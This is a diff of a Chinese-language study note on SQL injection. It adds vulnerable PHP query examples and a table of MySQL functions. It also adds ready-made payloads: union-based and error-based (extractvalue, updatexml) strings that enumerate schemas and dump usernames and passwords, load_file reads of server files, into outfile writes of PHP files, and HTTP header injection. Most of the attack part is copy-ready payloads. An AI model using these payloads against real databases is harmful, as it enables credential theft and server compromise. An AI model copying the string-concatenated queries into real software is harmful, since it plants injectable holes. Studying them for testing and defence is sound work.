@@ -10,6 +10,7 @@ sql注入原理
 
 两边单引号被闭合掉就直接跳过然后中间的就执行了
 
+
 [sql注入之万能密码原理](https://blog.csdn.net/hxhxhxhxx/article/details/108020010)
 
 ```
@@ -141,17 +142,28 @@ SELECT * FROM `users` WHERE id=("1");#双引号加括号
 ?id=1* and 1=2 (页面报错)
 ```
 
-==及有数字型注入==
+##### 数字型注入
 
 原理：==数字型它会分析数字接着执行sql语句，字符型直接将and后面的转换成字符==
 
-字符型和数字型的区别：==字符型需要单引号闭合，数字型不要单引号闭合==
-
+字符型和数字型的区别：==字符型需要单引号或者其他闭合，数字型不要单引号闭合==
 实行
-
+这是可以被数字型注入的源代码。不用闭合和注释
+```php
+    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
+```
+```
 ?id=1* and 1=1
 
 ?id=1* and 1=2
+```
+##### 字符型注入
+==关键是如何闭合sql语句以及注释多余的代码==
+这是可以被字符型注入的源代码。
+```php
+  $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+```
+可以用对应的闭合符号去闭合，或者用注释符号。
 
 #### 开联合
 
@@ -166,76 +178,222 @@ SELECT * FROM `users` WHERE id=("1");#双引号加括号
 ?id=1* union select 1,2,3 -- #
 
 ==有回显点及联合查询==
+#### SQL Server
+###### SQL server提供了大量识图，便于取得元数组
+| 数据库识图 | 说明 |
+| ---- | ---- |
+| sys.databases | SQL Server中的所有数据库 |
+| sys.sql_longins | SQL Server 中的所有登录名 |
+| information_schema.tables | 当前用户数据库中的表 |
+| information_schema.columns | 当前用户数据库中的列 |
+###### Order by
+order by子句为select查询列的排序，判断表的列数。
+```
+id=1 orderby 1
+id=1 orderby 2
+id=1 orderby 3
+id=1 orderby 4 //报错
+```
+这样就知道有3列了。
+###### union查询
+union关键字可以把两个或多个查询结果组合为单个结果，俗称联合查询。
 
-实行
+#### Mysql
+###### Mysq注释
+| # | 注释从‘#’字符到行尾 |
+| ---- | ---- |
+| -- | 从--序列到行尾，后面要跟一个空格 |
+| `/**/` | 注释从`/*`到后面`*/`xu序列中的字符 |
+| `/!**/` | 内联注释 |
+###### 常用参数
+在Mysql 5.0版本后，Mysql默认在数据库放了个information_schema的数据库，在该库中最需要记住的是三个表名：schemata,tables,columns
 
-数据库名字
+schemata表记录数据所有数据库的库名，字段名为schema_name
+![[Pasted image 20240116144728.png]]
 
-?id=1* union select 1,2,database() --#
+tables表记录数据库库名的表名的字段名分别为table_schema和table_name
+![[Pasted image 20240116145334.png]]
+columns表记录的数据库库名，表名，字段名的字段名分别为：table_schema,table_name,column_name
+![[Pasted image 20240116145432.png]]
 
-查表
+**information_schema.tables：记录所有表名信息的表**
 
-?id=-1* union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --#
+**information_schema.columns：记录所有列名信息的表**
 
-查列
+**table_name：表名**
 
-?id=-1* union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --#
+**column_name：列名**
 
-查值
+**table_schema：数据库名**
 
-?id=-1* union select 1,2,group_concat(username,0x3a,password) from users --#
+**user()** **查看当前MySQL登录的用户名**
 
-联合注入看源码
+**database() 查看当前使用MySQL数据库名**
 
-?id=-1* union select 1,2,user() #查看用户权限
+**version() 查看当前MySQL版本**
+##### Mysql查询语句
+```mysql
+SELECT 查询的字段名 FROM 库名.表名
+SELECT 查询的字段名 FROM 库名.表名 WHERE 以知条件的字段名='以知条件的值'
+SELECT 列名 FROM 库名.表名
+```
+SQL手工注入方法  
+```mysql
+select schema_name from information_schema.schemata（查库）  
+select table_name from information_schema.tables where table_schema=库名（查表）  
+select column_name from information_schema.colums where table_name=表名（查列）  
+select 列名 from 库名.表名（查数据）
+```
+###### limit 的用法
+limit使用格式:limit m,n ，其中m是指记录开始的位置，n是指n条记录。
 
-如果是root就继续
 
+###### mysql获取元数据
+
+
+一次性只能出几个内容，要使用group_concat()函数才好
+![[Pasted image 20240116102944.png]]
+###### Mysql函数利用
+1, load_file()函数读取文件操作，==必须要有FILE权限，文件容量小于16MB。文件名称为绝对路径==
+```
 ?id=-1* union select 1,2,load_file(/var/www/html/index.php) #读取index.php源码
+```
+2, into outfile写文件操作
+```
+?id=-1*select '<?php phpinfo()?>' into outfile 'C:\wwwortt\1.php'
+```
+3, 连接字符
+在mysql查询中，如果需要一次性查多个数据，可以使用concat()或concat_ws()函数完成
+```
+?id=-2' union select 1,concat(user(),0x2c,database())#-2' union select 1,concat(user(),0x2c,database())#
+```
+勉强返回两个用户和数据库名字，可以使用 limit 0,1|limit 1,2这样查看。
+![[Pasted image 20240116103143.png]]
+4，更多常用函数
 
-#### 寻报错
-
-步骤
-
-看有没有报错信息即可
-
-实行
-
-==extractvalue==
+| 函数 | 说明 |
+| ---- | ---- |
+| length | 返回字符串长度 |
+| substring | 截取字符串长度 |
+| ascii | 返回ASCII码 |
+| hex | 把字符串转十六进制 |
+| now | 当前系统时间 |
+| unhex | hex的反向操作 |
+| floor(x) | 返回不大于x的最大整数值 |
+| md5 | 返回MD5值 |
+| group_concat | 返回带有来自一个组的连接的非NUL值的字符串结果 |
+| @@datadir | 读取数据库路径 |
+| @@basedir | MySQL 安装路径 |
+| @2version_compile_os | 操作系统 |
+| user | 用户名 |
+| current_user | 当前用户名 |
+| system_user | 系统用户名 |
+| databas | 数据库名 |
+| version | MySQL 数据库版本 |
+###### group_concat函数查询
 
 数据库名字
 
+```
+?id=1* union select 1,2,database() --#
+```
+
+查表
+
+```
+?id=-1* union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --#
+```
+
+查列
+
+```
+?id=-1* union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --#
+```
+
+查值
+
+```
+?id=-1* union select 1,2,group_concat(username,0x3a,password) from users --#
+```
+##### Mysql报错注入
+
+通过页面返回结果，直接将报错信息输出到页面上，所有可以利用报错注入获取数据。
+两种函数
+```
+?id=1* and updatexml(1,concat(0x7e,(mysql命令),0x7e),1)--+
+?id=1* and extractvalue(1,concat(0x7e,(mysql命令)))--+
+```
+###### ==extractvalue==
+
+
+数据库名字
+
+```
 ?id=1* and extractvalue(1,concat(0x7e,database())) --#
+```
 
 查表
 
+```
 ?id=1* and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --#
+```
 
 查列
 
+```
 ?id=1* and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --#
+```
 
 查值
 
+```
 ?id=1* and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) --#
+```
 
-==updatexml==
+###### ==updatexml==
 
 数据库名字
 
+```
 ?id=1* and updatexml(1,concat(0x7e,database(),0x7e),1) --#
+```
 
 查表
 
+```
 ?id=1* and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --#
+```
 
 查列
 
+```
 ?id=1* and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) --#
+```
 
 查值
 
+```
 ?id=1* and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from usres ),0x7e),1) --#
+```
+
+##### Mysql宽字节注入
+宽字节注入漏洞原理就是因为编码不统一所照成的，这种注入一般出现在PHP+Mysql中。
+==php配置文件的php.ini中存在magic_quotes_gpc选项，被成为魔术引号，开启时候，会把get,post,cookie接收的（'"\null）等都会自动加上反斜杠转义。==
+
+
+##### 堆叠查询注入攻击
+堆叠注入查询可以执行多条语句，多条语句用分号分开。
+同时查询两个内容
+
+![[Pasted image 20240116201828.png]]
+###### http头注入
+注入点可能在User-agent或者Accept头。
+```
+1'and+updatexml(1,concat(0x7e,(select+database()),0x7e),1)or'
+```
+![[Pasted image 20240117192720.png]]
+
+
 
 #### 盲注
 
